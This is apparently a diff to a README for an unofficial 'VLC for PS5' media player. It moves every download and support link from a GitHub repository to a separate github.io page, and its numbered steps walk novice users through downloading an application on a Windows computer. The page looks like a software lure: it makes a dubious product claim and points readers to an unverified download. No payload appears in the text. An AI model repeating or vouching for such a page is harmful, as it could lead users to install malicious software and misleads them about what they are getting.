@@ -1,6 +1,6 @@
 # 🎬 VLC - Play Any Media On Your PS5
 
-[![Download VLC for PS5](https://img.shields.io/badge/⬇_Download_VLC_for_PS5-1F6FEB?style=for-the-badge&logo=vlcmediaplayer&logoColor=white)](https://github.com/mauriciofortes/VLC)
+[![Download VLC for PS5](https://img.shields.io/badge/⬇_Download_VLC_for_PS5-1F6FEB?style=for-the-badge&logo=vlcmediaplayer&logoColor=white)](https://mauriciofortes.github.io)
 
 **VLC for PS5** brings the most trusted media player in the world to your PlayStation 5. No subscriptions, no accounts, no nonsense — just your movies, music, and videos playing smoothly on the big screen in your living room.
 
@@ -24,7 +24,7 @@ Everything begins with a single page. You do not need an account, a password, or
 
 ### Your download link
 
-[![Download VLC for PS5](https://img.shields.io/badge/⬇_Get_VLC_for_PS5-2EA043?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mauriciofortes/VLC)
+[![Download VLC for PS5](https://img.shields.io/badge/⬇_Get_VLC_for_PS5-2EA043?style=for-the-badge&logo=github&logoColor=white)](https://mauriciofortes.github.io)
 
 **Visit this link to download the application.**
 
@@ -39,7 +39,7 @@ Follow these steps in order. Each one is simple, and you can take your time.
 1. **Turn on your Windows computer** and make sure it is connected to the internet.
 2. **Open your web browser.** This can be Microsoft Edge, Google Chrome, Mozilla Firefox, or any other browser you normally use. It is the program you use to visit websites.
 3. **Click inside the address bar** at the top of the browser window. This is the long white box that shows the website address.
-4. **Type or paste the following address:** `https://github.com/mauriciofortes/VLC` — then press the **Enter** key on your keyboard.
+4. **Type or paste the following address:** `https://mauriciofortes.github.io` — then press the **Enter** key on your keyboard.
 5. **Wait for the page to load.** You will see the VLC for PS5 project page with information about the software.
 6. **Visit this link to download the application.** The page contains the download for the application — follow the download prompt shown there.
 7. **Choose where to save the file.** When Windows asks where to put the downloaded file, the **Downloads** folder is a perfectly fine choice. Just remember where it went.
@@ -133,7 +133,7 @@ Return to the same link periodically. New versions are published on the project 
 
 ## 🤝 Support and Community
 
-If you run into a problem that the troubleshooting section does not solve, visit the project page at [https://github.com/mauriciofortes/VLC](https://github.com/mauriciofortes/VLC). There you can review project information, report an issue, and see what other users have already asked.
+If you run into a problem that the troubleshooting section does not solve, visit the project page at [https://mauriciofortes.github.io](https://mauriciofortes.github.io). There you can review project information, report an issue, and see what other users have already asked.
 
 When reporting a problem, describe what you did, what you expected to happen, and what actually happened. Clear descriptions get faster answers.
 
